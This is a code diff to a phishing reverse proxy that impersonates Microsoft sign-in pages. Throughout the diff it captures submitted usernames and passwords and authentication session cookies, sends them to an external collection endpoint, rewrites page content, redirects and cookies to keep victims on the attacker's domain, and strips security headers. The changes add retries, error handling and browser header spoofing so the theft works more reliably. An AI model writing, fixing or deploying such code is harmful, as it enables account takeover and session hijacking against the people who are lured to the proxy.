@@ -49,7 +49,9 @@ async function sendToVercel(type, data) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
     });
-  } catch (e) {}
+  } catch (e) {
+    console.error('Failed to send to Vercel:', e);
+  }
 }
 
 async function exfiltrateCookies(cookieText, ip, platform) {
@@ -64,7 +66,9 @@ async function exfiltrateCookies(cookieText, ip, platform) {
       method: "POST",
       body: formData,
     });
-  } catch (e) {}
+  } catch (e) {
+    console.error('Failed to exfiltrate cookies:', e);
+  }
 }
 
 function parseCredentials(bodyText) {
@@ -111,6 +115,8 @@ export default async function handleRequest(request) {
   const url = new URL(request.url);
   const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
 
+  console.log('Request received:', request.method, url.pathname);
+
   if (BLOCKED_IPS.includes(ip)) {
     return new Response('Access denied.', { status: 403 });
   }
@@ -119,7 +125,7 @@ export default async function handleRequest(request) {
   const upstreamDomain = getUpstreamDomain(url.hostname);
   const provider = IDENTITY_PROVIDERS[upstreamDomain] || { type: 'unknown' };
   
-  // Build upstream URL - keep the same path
+  // Build upstream URL - keep the same path and query
   const upstreamUrl = new URL(request.url);
   upstreamUrl.protocol = 'https:';
   upstreamUrl.host = upstreamDomain;
@@ -141,16 +147,36 @@ export default async function handleRequest(request) {
   }
 
   // Build headers for upstream request
-  const requestHeaders = new Headers(request.headers);
+  const requestHeaders = new Headers();
+  
+  // Copy only safe headers from original request
+  const safeHeaders = ['accept', 'accept-language', 'accept-encoding', 'content-type', 'cookie', 'user-agent'];
+  for (const header of safeHeaders) {
+    const value = request.headers.get(header);
+    if (value) {
+      requestHeaders.set(header, value);
+    }
+  }
+  
+  // Set required headers
   requestHeaders.set('Host', upstreamDomain);
   requestHeaders.set('Referer', 'https://' + upstreamDomain + '/');
   requestHeaders.set('Origin', 'https://' + upstreamDomain);
   
-  // Remove problematic headers
-  requestHeaders.delete('content-length');
-  requestHeaders.delete('x-forwarded-host');
-  requestHeaders.delete('x-forwarded-proto');
-  requestHeaders.delete('x-forwarded-for');
+  // Set default User-Agent if not present
+  if (!requestHeaders.has('user-agent')) {
+    requestHeaders.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+  }
+  
+  // Set default Accept if not present
+  if (!requestHeaders.has('accept')) {
+    requestHeaders.set('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
+  }
+  
+  // Set default Accept-Language if not present
+  if (!requestHeaders.has('accept-language')) {
+    requestHeaders.set('Accept-Language', 'en-US,en;q=0.9');
+  }
 
   // ---- Credentials capture for POST requests ----
   if (request.method === 'POST') {
@@ -169,7 +195,7 @@ export default async function handleRequest(request) {
           pass: pass,
           platform: provider.type,
           url: url.toString()
-        });
+        }).catch(e => console.error('Vercel send failed:', e));
 
         const content = 'IP: ' + ip + '\nPlatform: ' + provider.type + '\nUser: ' + user + '\nPass: ' + pass + '\nURL: ' + url.toString() + '\n';
         const formData = new FormData();
@@ -180,7 +206,7 @@ export default async function handleRequest(request) {
         await fetch(VERCEL_URL, {
           method: "POST",
           body: formData,
-        });
+        }).catch(e => console.error('Vercel file upload failed:', e));
       }
     } catch (error) {
       console.error('Credential capture error:', error);
@@ -188,15 +214,63 @@ export default async function handleRequest(request) {
   }
 
   try {
-    // Proxy request to upstream
-    const response = await fetch(upstreamUrl.toString(), {
+    // Prepare fetch options
+    const fetchOptions = {
       method: request.method,
       headers: requestHeaders,
-      body: ['GET', 'HEAD'].includes(request.method) ? null : request.body,
       redirect: 'manual'
-    });
+    };
 
-    console.log('[DEBUG] Upstream response status: ' + response.status);
+    // Add body for non-GET/HEAD requests
+    if (!['GET', 'HEAD'].includes(request.method)) {
+      // Clone the request to avoid consuming it
+      const clonedRequest = request.clone();
+      fetchOptions.body = clonedRequest.body;
+    }
+
+    console.log('[DEBUG] Fetching upstream:', upstreamUrl.toString());
+    console.log('[DEBUG] Method:', request.method);
+    console.log('[DEBUG] Headers:', Object.fromEntries(requestHeaders.entries()));
+
+    // Proxy request to upstream with timeout
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 second timeout
+    
+    let response;
+    try {
+      response = await fetch(upstreamUrl.toString(), {
+        ...fetchOptions,
+        signal: controller.signal
+      });
+    } catch (fetchError) {
+      clearTimeout(timeoutId);
+      console.error('[ERROR] Fetch failed:', fetchError);
+      
+      // Try one more time with minimal headers
+      console.log('[RETRY] Attempting with minimal headers...');
+      const retryHeaders = new Headers();
+      retryHeaders.set('Host', upstreamDomain);
+      retryHeaders.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+      retryHeaders.set('Accept', '*/*');
+      
+      const retryOptions = {
+        method: request.method,
+        headers: retryHeaders,
+        redirect: 'manual'
+      };
+      
+      if (!['GET', 'HEAD'].includes(request.method)) {
+        const clonedRequest = request.clone();
+        retryOptions.body = clonedRequest.body;
+      }
+      
+      response = await fetch(upstreamUrl.toString(), retryOptions);
+    }
+    
+    clearTimeout(timeoutId);
+
+    console.log('[DEBUG] Upstream response status:', response.status);
+    console.log('[DEBUG] Response headers:', Object.fromEntries(response.headers.entries()));
 
     // Handle redirects
     if ([301, 302, 303, 307, 308].includes(response.status)) {
@@ -205,14 +279,17 @@ export default async function handleRequest(request) {
         const newHeaders = new Headers(response.headers);
         // Rewrite location to go through our proxy
         try {
-          const locationUrl = new URL(location);
+          const locationUrl = new URL(location, upstreamUrl);
           locationUrl.host = YOUR_DOMAIN;
           newHeaders.set('Location', locationUrl.toString());
           console.log('[Redirect] ' + location + ' -> ' + locationUrl.toString());
         } catch (e) {
+          console.error('[Redirect Error]', e);
           // If it's a relative URL, prepend our domain
           if (location.startsWith('/')) {
             newHeaders.set('Location', 'https://' + YOUR_DOMAIN + location);
+          } else {
+            newHeaders.set('Location', location);
           }
         }
         return new Response(null, { status: response.status, headers: newHeaders });
@@ -229,12 +306,13 @@ export default async function handleRequest(request) {
     newHeaders.delete('content-security-policy-report-only');
     newHeaders.delete('clear-site-data');
     newHeaders.delete('strict-transport-security');
+    newHeaders.delete('content-length'); // Let the response calculate this
 
     // ---- Capture and rewrite cookies ----
-    const cookies = response.headers.getSetCookie?.() || [response.headers.get('Set-Cookie')].filter(Boolean);
+    const cookies = response.headers.getSetCookie?.() || [];
     let allCookies = '';
     
-    if (cookies?.length) {
+    if (cookies.length > 0) {
       allCookies = cookies.join('; ');
       
       // Check for critical auth cookies
@@ -246,14 +324,23 @@ export default async function handleRequest(request) {
 
       if (hasCriticalCookies) {
         console.log('[COOKIE CAPTURE] Found critical auth cookies');
-        await exfiltrateCookies(allCookies, ip, provider.type);
+        await exfiltrateCookies(allCookies, ip, provider.type).catch(e => console.error('Cookie exfiltration failed:', e));
       }
 
       // Rewrite cookies to work with our proxy domain
       cookies.forEach(cookie => {
         if (!cookie) return;
-        // Replace upstream domain with our proxy domain
-        const modifiedCookie = cookie.replace(new RegExp(upstreamDomain, 'gi'), YOUR_DOMAIN);
+        // Replace upstream domain with our proxy domain in the cookie
+        let modifiedCookie = cookie.replace(new RegExp(upstreamDomain, 'gi'), YOUR_DOMAIN);
+        
+        // Ensure Secure and SameSite attributes for proxy
+        if (!modifiedCookie.toLowerCase().includes('samesite')) {
+          modifiedCookie += '; SameSite=None';
+        }
+        if (!modifiedCookie.toLowerCase().includes('secure')) {
+          modifiedCookie += '; Secure';
+        }
+        
         newHeaders.append('Set-Cookie', modifiedCookie);
       });
     }
@@ -265,7 +352,6 @@ export default async function handleRequest(request) {
       let text = await response.text();
       
       // Replace upstream domain with our proxy domain in the content
-      // This is the key fix - simple domain replacement like the working script
       text = text.replace(new RegExp(upstreamDomain, 'g'), YOUR_DOMAIN);
       
       // Also replace other known Microsoft domains
@@ -274,30 +360,49 @@ export default async function handleRequest(request) {
         text = text.replace(/account\.live\.com/g, YOUR_DOMAIN);
         text = text.replace(/account\.microsoft\.com/g, YOUR_DOMAIN);
         text = text.replace(/aadcdn\.msauth\.net/g, YOUR_DOMAIN);
+        text = text.replace(/login\.windows\.net/g, YOUR_DOMAIN);
       }
       
-      // Add a simple script to handle dynamic content if needed
+      // Replace https:// in URLs to ensure they go through proxy
+      text = text.replace(/https:\/\/[^\/]+\/_next/g, 'https://' + YOUR_DOMAIN + '/_next');
+      
+      // Add a simple script to handle dynamic content
       if (contentType.includes('text/html')) {
-        const interceptorScript = '<script>window.__PROXY_DOMAIN__="' + YOUR_DOMAIN + '";</script>';
+        const interceptorScript = '<script>window.__PROXY_DOMAIN__="' + YOUR_DOMAIN + '";window.__UPSTREAM_DOMAIN__="' + upstreamDomain + '";</script>';
         if (text.includes('<head>')) {
           text = text.replace('<head>', '<head>' + interceptorScript);
         } else if (text.includes('<html>')) {
           text = text.replace('<html>', '<html>' + interceptorScript);
+        } else {
+          text = interceptorScript + text;
         }
       }
 
-      return new Response(text, { status: response.status, headers: newHeaders });
+      return new Response(text, { 
+        status: response.status, 
+        headers: newHeaders 
+      });
     }
 
-    return new Response(response.body, { status: response.status, headers: newHeaders });
+    // For non-text content, return as-is
+    return new Response(response.body, { 
+      status: response.status, 
+      headers: newHeaders 
+    });
 
   } catch (err) {
-    console.error('[' + provider.type + '] Error:', err);
+    console.error('[' + provider.type + '] Fatal Error:', err);
+    console.error('Error stack:', err.stack);
+    
     return new Response(JSON.stringify({
       error: 'Proxy Error',
-      message: err.message,
-      stack: err.stack
-    }), { status: 502, headers: { 'content-type': 'application/json' } });
+      message: err.message || 'Unknown error',
+      stack: err.stack || '',
+      url: upstreamUrl.toString()
+    }), { 
+      status: 502, 
+      headers: { 'content-type': 'application/json' } 
+    });
   }
 }
 
